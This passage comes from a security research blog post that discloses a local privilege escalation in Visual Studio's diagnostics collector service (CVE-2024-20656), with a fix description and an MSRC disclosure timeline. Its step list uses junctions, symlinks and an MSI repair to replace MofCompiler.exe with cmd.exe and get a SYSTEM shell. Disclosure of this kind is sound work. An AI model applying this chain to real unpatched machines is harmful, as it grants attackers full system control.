+    <span class="hljs-selector-tag">NT</span> <span class="hljs-selector-tag">AUTHORITY</span>\\<span class="hljs-selector-tag">Authenticated</span> <span class="hljs-selector-tag">Users</span><span class="hljs-selector-pseudo">:(OI)(CI)(IO)(M)</span>
+    <span class="hljs-selector-tag">NT</span> <span class="hljs-selector-tag">AUTHORITY</span>\\<span class="hljs-selector-tag">Authenticated</span> <span class="hljs-selector-tag">Users</span><span class="hljs-selector-pseudo">:(AD)</span>
+    <span class="hljs-selector-tag">S-1-15-3-65536-1888954469-739942743-1668119174-2468466756-4239452838-1296943325-355587736-700089176</span><span class="hljs-selector-pseudo">:(S</span>,<span class="hljs-selector-tag">RD</span>,<span class="hljs-selector-tag">X</span>,<span class="hljs-selector-tag">RA</span>)
+    <span class="hljs-selector-tag">Mandatory</span> <span class="hljs-selector-tag">Label</span>\\<span class="hljs-selector-tag">High</span> <span class="hljs-selector-tag">Mandatory</span> <span class="hljs-selector-tag">Level</span><span class="hljs-selector-pseudo">:(OI)(NP)(IO)(NW)</span>
+</code></pre>
+<h3 class="wp-block-heading">Abusing the Windows Error Reporting Service</h3>
+<p>The first attempt to weaponise this vulnerability was to abuse the WER service to create an arbitrary folder for us that we can later abuse by loading SxS assemblies. This technique was documented by <a href="https://secret.club/2020/04/23/directory-deletion-shell.html">@jonaslyk</a> where he abused an arbitrary file delete bug to delete the <code>C:\\ProgramData\\Microsoft\\Windows\\WER</code> directory and force the WER service to recreate it and create child folders too.</p>
+<p>In our case we can gain control of the WER directory using the arbitrary file dacl reset vulnerability, direct it to our junction point, create an object manager symbolic link which will allows us to create an arbitrary directory (in the first PoC I created it was the msiexec.exe.local directory), drop combase.dll inside and load it in the MSIServer service.</p>
+<p>While this PoC was successful locally, the MSRC could not confirm the vulnerability as they were testing on an insider version in which the WER service already had the junction protection and could not be abused.</p>
+<h3 class="wp-block-heading">Abusing MSI Repairs</h3>
+<p>After MSRC failed to confirm the vulnerability, I had to find a different method to abuse this dacl reset.</p>
+<p>While looking through ProgramData directory I remembered that Visual Studio will create the <em>MofCompiler.exe</em> binary inside <code>C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI</code> directory.</p>
+<p>This binary is related to WMI integration inside Visual Studio. The interesting bit here is that this binary will be executed with <em>SYSTEM</em> privileges via MSI repairs.</p>
+<p>Many programs when installed will store their installer package inside <code>C:\\windows\\installer</code> directory and more then often not these installers will allow low privilege users to run them in repair mode in order to repair a broken installation.</p>
+<p>This was also case with the <code>Setup WMI Provider</code> installer that comes by default with Visual Studio.</p>
+<p>This installer also has custom actions defined and that custom action is configured to execute the <code>C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe</code> binary.</p>
+<p>With this we have all pieces for our exploit, to summarise:</p>
+<ul>
+<li>Create a dummy directory where the <em>VSStandardCollectorService150</em> will write files.</li>
+<li>Create a junction directory that points to a newly created directory.</li>
+<li>Trigger the <em>VSStandardCollectorService150</em> service by creating a new diagnostic session.</li>
+<li>Wait for the <code>&lt;GUID&gt;.scratch</code> directory to be created and create new object manager symbolic link <code>Report.&lt;GUID&gt;.diagsession</code> that points to <code>C:\\ProgramData</code> .</li>
+<li>Stop the diagnostic session.</li>
+<li>Wait for the <code>Report.&lt;GUID&gt;.diagsession</code> file to be moved to the parent directory and switch the junction directory to point to <code>\\RPC Control</code> where our symbolic link is waiting.</li>
+<li>Sleep for 5 seconds (not really important but left it there).</li>
+<li>Switch the junction directory to point to a dummy directory.</li>
+<li>Start a new diagnostic session.</li>
+<li>Wait for <code>&lt;GUID&gt;.scratch</code> directory to be created and create a new object manager symbolic link <code>Report.&lt;GUID&gt;.diagsession</code> that points to <code>C:\\ProgramData\\Microsoft</code></li>
+<li>Stop the diagnostic session.</li>
+<li>Wait for the <code>Report.&lt;GUID&gt;.diagsession</code> file to be moved to parent directory and switch the junction directory to point to <code>\\RPC Control</code> where our symbolic link is waiting.</li>
+<li>After the permissions are changed we delete the <code>C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe</code> binary.</li>
+<li>Locate and run the <code>Setup WMI provider</code> in repair mode.</li>
+<li>Wait for our new <code>MofCompiler.exe</code> binary to be created by the installer and replace it with cmd.exe</li>
+<li>Enjoy SYSTEM shell 🙂</li>
+</ul>
+<figure class="wp-block-image size-large is-style-default"><img loading="lazy" decoding="async" width="960" height="416" src="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-10-960x416.png" alt="" class="wp-image-3357" srcset="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-10-960x416.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-10-768x333.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-10-1536x666.png 1536w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-10-1920x832.png 1920w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-10-375x163.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-10.png 2000w" sizes="(max-width: 960px) 100vw, 960px"></figure>
+<h2 class="wp-block-heading">Fix</h2>
+<p>After the January fix we can no longer redirect the <em>SetNamedSecurityInfo</em> API call and DACL reset is performed inside restricted directory:</p>
+<figure class="wp-block-image size-large is-style-default"><img loading="lazy" decoding="async" width="960" height="254" src="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-11-960x254.png" alt="" class="wp-image-3358" srcset="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-11-960x254.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-11-768x203.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-11-1536x406.png 1536w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-11-1920x508.png 1920w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-11-375x99.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-11.png 2000w" sizes="(max-width: 960px) 100vw, 960px"></figure>
+<p>Furthermore, the file is moved while impersonating the client:</p>
+<figure class="wp-block-image size-large is-style-default"><img loading="lazy" decoding="async" width="960" height="500" src="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-12-960x500.png" alt="" class="wp-image-3359" srcset="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-12-960x500.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-12-768x400.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-12-1536x799.png 1536w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-12-1920x999.png 1920w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-12-375x195.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-12.png 2000w" sizes="(max-width: 960px) 100vw, 960px"></figure>
+<h1 class="wp-block-heading">Timeline</h1>
+<ul>
+<li>07/20/2023 – Sent report with PoC to MSRC</li>
+<li>07/28/2023 – MSRC notifies me that they cannot they cannot reproduce vulnerability</li>
+<li>07/28/2023 – Sent additional information regarding the exploit</li>
+<li>08/14/2023 – MSRC notifies me again that they cannot reproduce vulnerability</li>
+<li>08/14/2023 – Send second exploit that works on later Windows Insider Preview</li>
+<li>08/15/2023 – MSRC confirms vulnerability</li>
+<li>08/15/2023 – Bounty awarded</li>
+<li>09/08/2023 – MSRC schedule fix for January 2024</li>
+<li>01/09/2024 – Fix released</li>
+</ul>
+<p>This blog post is written by <a href="https://twitter.com/filip_dragovic">Filip Dragovic</a>.</p>
+</div>
+<div class="author">
+<div class="content-wrapper clearfix">
+<div class="author-avatar">
+<img alt="" src="https://secure.gravatar.com/avatar/ea6be35ff31bf7eba02c999d1d41eff2?s=96&amp;d=wp_user_avatar&amp;r=g" srcset="https://secure.gravatar.com/avatar/ea6be35ff31bf7eba02c999d1d41eff2?s=192&amp;d=wp_user_avatar&amp;r=g 2x" class="avatar avatar-96 photo" height="96" width="96" loading="lazy" decoding="async"> </div>
+<div class="author-meta">
+<div class="author-meta__content">
+<span>written by</span>
+<h4>MDSec Research</h4>
+</div>
+</div>
+</div>
+</div>
+<section class="testing">
+<div class="content-wrapper">
+<h2>Ready to engage<br>with MDSec?</h2>
+<div class="button">
+<a href="https://www.mdsec.co.uk/contact">
+Get in touch
+</a>
+</div>
+</div>
+</section>
+</section>
+<section class="newsletter">
+<div class="content-wrapper clearfix">
+<div class="newsletter-left">
+<p>
+Stay updated with the latest <br>news from MDSec.
+</p>
+</div>
+<div class="newsletter-right">
+<div class="frm_forms  with_frm_style frm_style_formidable-style" id="frm_form_2_container">
+<form enctype="multipart/form-data" method="post" class="frm-show-form  frm_js_validate " id="form_newslettersignupform">
+<div class="frm_form_fields ">
+<fieldset>
+<legend class="frm_screen_reader">Newsletter Signup Form</legend>
+<div class="frm_fields_container">
+<input type="hidden" name="frm_action" value="create">
+<input type="hidden" name="form_id" value="2">
+<input type="hidden" name="frm_hide_fields_2" id="frm_hide_fields_2" value="">
+<input type="hidden" name="form_key" value="newslettersignupform">
+<input type="hidden" name="item_meta[0]" value="">
+<input type="hidden" id="frm_submit_entry_2" name="frm_submit_entry_2" value="4431734a25"><input type="hidden" name="_wp_http_referer" value="/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/"><div id="frm_field_10_container" class="frm_form_field form-field  frm_none_container frm_full">
+<label for="field_nkjbj" id="field_nkjbj_label" class="frm_primary_label">Email
+<span class="frm_required"></span>
+</label>
+<input type="email" id="field_nkjbj" name="item_meta[10]" value="" placeholder="Enter your email for updates" data-invmsg="Email is invalid" aria-invalid="false">
+</div>
+<div id="frm_field_11_container" class="frm_form_field form-field  frm_none_container frm_first frm_full">
+<label for="g-recaptcha-response" id="field_ah4d8_label" class="frm_primary_label">
+<span class="frm_required"></span>
+</label>
+<div id="field_ah4d8" class="frm-g-recaptcha" data-sitekey="6Lc27L0ZAAAAAMV4QCtKwWRbT-Hm1FnY6IKqcSxw" data-size="invisible" data-theme="light" data-rid="0"><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-kkw8ikdysqtw" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6Lc27L0ZAAAAAMV4QCtKwWRbT-Hm1FnY6IKqcSxw&amp;co=aHR0cHM6Ly93d3cubWRzZWMuY28udWs6NDQz&amp;hl=pl&amp;v=TqxSU0dsOd2Q9IbI7CpFnJLD&amp;theme=light&amp;size=invisible&amp;cb=4qvomfq1pzh3"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;"></iframe></div>
+</div>
+<input type="hidden" name="item_key" value="">
+<div class="frm__6539d1f4bfefd">
+<label for="frm_email_2" style="display:none;">
+If you are human, leave this field blank. </label>
+<input id="frm_email_2" type="text" class="frm_verify" name="frm__6539d1f4bfefd" value="" autocomplete="off" style="display:none;">
+</div>
+<div class="frm_submit">
+<button class="frm_button_submit" type="submit">Submit</button>
+</div></div>
+</fieldset>
+</div>
+</form>
+</div>
+</div>
+</div>
+</section>
+</div>
+
+
+<footer>
+<div class="content-wrapper clearfix">
+<div class="footer-col">
+<div class="footer-logo">
+<a href="https://www.mdsec.co.uk" title="MDSec">
+<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/mdsec-logo.svg" alt="MDsec">
+</a>
+</div>
+</div>
+<div class="footer-col">
+<h3>Services</h3>
+<nav class="footer-nav">
+<ul>
+<li><a href="https://www.mdsec.co.uk/our-services/adversary-simulation/">Adversary Simulation</a></li>
+<li><a href="https://www.mdsec.co.uk/our-services/applicaton-security/">Application Security</a></li>
+<li><a href="https://www.mdsec.co.uk/our-services/penetration-testing/">Penetration Testing</a></li>
+<li><a href="https://www.mdsec.co.uk/our-services/response/">Response</a></li>
+</ul>
+</nav>
+<h3>Resource Centre</h3>
+<nav class="footer-nav">
+<ul>
+<li><a href="https://www.mdsec.co.uk/knowledge-centre/research/">Research</a></li>
+<li><a href="https://www.mdsec.co.uk/knowledge-centre/training/">Training</a></li>
+<li><a href="https://www.mdsec.co.uk/knowledge-centre/insights/">Insights</a></li>
+</ul>
+</nav>
+</div>
+<div class="footer-col">
+<h3>Company</h3>
+<nav class="footer-nav">
+<ul>
+<li><a href="https://www.mdsec.co.uk/about/">About</a></li>
+<li><a href="https://www.mdsec.co.uk/contact/">Contact</a></li>
+<li><a href="https://www.mdsec.co.uk/careers/">Careers</a></li>
+<li><a href="https://www.mdsec.co.uk/privacy-policy/">Privacy</a></li>
+</ul>
+</nav>
+<p>
+t: +44 (0) 1625 263 503<br>
+e: <a href="mailto:contact@mdsec.co.uk">contact@mdsec.co.uk</a>
+</p>
+<p>
+32A Park Green<br>
+Macclesfield<br>
+Cheshire<br>
+SK11 7NA
+</p>
+</div>
+<div class="footer-col">
+<h3>Accreditations</h3>
+<div class="logo-list clearfix">
+<div class="logo-list__item">
+<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/logos/best.png" alt="Best">
+</div>
+<div class="logo-list__item">
+<img src="https://www.mdsec.co.uk/wp-content/uploads/2019/11/check-whitetrans.png" alt="IT Health Check Service">
+</div>
+<div class="logo-list__item">
+<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/logos/crest-star.png" alt="Crest Star">
+</div>
+<div class="logo-list__item">
+<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/logos/crest.png" alt="Crest">
+</div>
+<div class="logo-list__item">
+<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/logos/cyber-essentials.png" alt="Cyber Essentials">
+</div>
+<div class="logo-list__item">
+<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/logos/british-assessment-bureau.png" alt="British Assessment Bureau">
+</div>
+</div>
+</div>
+</div>
+</footer>
+<div class="end clearfix">
+<div class="end__left">
+Copyright 2024 MDSec
+</div>
+<div class="end__right">
+
+</div>
+</div>
+
+<script type="text/javascript" src="https://www.mdsec.co.uk/wp-includes/js/jquery/jquery.js?ver=1.11.0" id="jquery-js"></script>
+<script type="text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/main.js?ver=1" id="main-js"></script>
+<script type="text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/highlight.min.js?ver=1" id="prism-js-js"></script>
+<script type="text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/isotope.pkgd.min.js?ver=1" id="isotope-js-js"></script>
+<script type="text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/jquery.matchHeight.js?ver=1.0.0" id="matchheight-js-js"></script>
+<script type="text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/modernizr.js?ver=2.8.3" id="modernizr-script-js"></script>
+<script type="text/javascript" id="formidable-js-extra">
+/* <![CDATA[ */
+var frm_js = {"ajax_url":"https:\/\/www.mdsec.co.uk\/wp-admin\/admin-ajax.php","images_url":"https:\/\/www.mdsec.co.uk\/wp-content\/plugins\/formidable\/images","loading":"Loading\u2026","remove":"Remove","offset":"4","nonce":"d6102c5e35","id":"ID","no_results":"No results match","file_spam":"That file looks like Spam.","calc_error":"There is an error in the calculation in the field with key","empty_fields":"Please complete the preceding required fields before uploading a file.","focus_first_error":"1","include_alert_role":"1","include_update_field":"","include_resend_email":""};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://www.mdsec.co.uk/wp-content/plugins/formidable/js/frm.min.js?ver=6.10" id="formidable-js"></script>
+<script async="async" type="text/javascript" defer="defer" src="https://www.google.com/recaptcha/api.js?onload=frmRecaptcha&amp;render=explicit&amp;ver=3" id="captcha-api-js"></script>
+<script type="text/javascript">
+		
+		$grid = jQuery('.grid').isotope({
+			itemSelector: '.grid-item',
+			percentPosition: true,
+			masonry: {
+			columnWidth: '.grid-sizer',
+			gutter: '.gutter-sizer',
+			}
+		});
+
+		jQuery('.filter-group').on( 'click', 'li', function() {
+			var filterValue = jQuery(this).attr('data-filter');
+			var filterName = jQuery(this).attr('data-name');
+			$grid.isotope({ filter: filterValue });
+			var elems = $grid.isotope('getFilteredItemElements');
+			jQuery(".sort-group-item").removeClass('active');
+
+		});	
+
+	</script>
+<script type="text/javascript" src="/wp-content/themes/mdsec/jquery.marquee.min.js"></script>
+<script type="text/javascript">
+	jQuery(window).load(function() {
+		jQuery('.message').marquee({
+			//speed in milliseconds of the marquee
+			duration: 12000,
+			//gap in pixels between the tickers
+			gap: 0,
+			//time in milliseconds before the marquee will start animating
+			delayBeforeStart: 500,
+			//'left' or 'right'
+			direction: 'left',
+			//true or false - should the marquee be duplicated to show an effect of continues flow
+			duplicated: true,
+			pauseOnHover: true,
+			startVisible: true
+		});
+		
+		jQuery('.message-item').css('opacity', '1');
+	});
+	</script>
+<script type="text/javascript">hljs.initHighlightingOnLoad();</script>
+
+
+
+<div style="visibility: hidden; position: absolute; width: 100%; top: -10000px; left: 0px; right: 0px; transition: visibility 0s linear 0.3s, opacity 0.3s linear; opacity: 0;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.5;"></div><div style="margin: 0px auto; top: 0px; left: 0px; right: 0px; position: fixed; border: 1px solid rgb(204, 204, 204); z-index: 2000000000; background-color: rgb(255, 255, 255);"><iframe title="Test reCAPTCHA wygaśnie za 2&nbsp;minuty" style="width: 100%; height: 100%;" name="c-kkw8ikdysqtw" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/bframe?hl=pl&amp;v=TqxSU0dsOd2Q9IbI7CpFnJLD&amp;k=6Lc27L0ZAAAAAMV4QCtKwWRbT-Hm1FnY6IKqcSxw"></iframe></div></div></body></html>
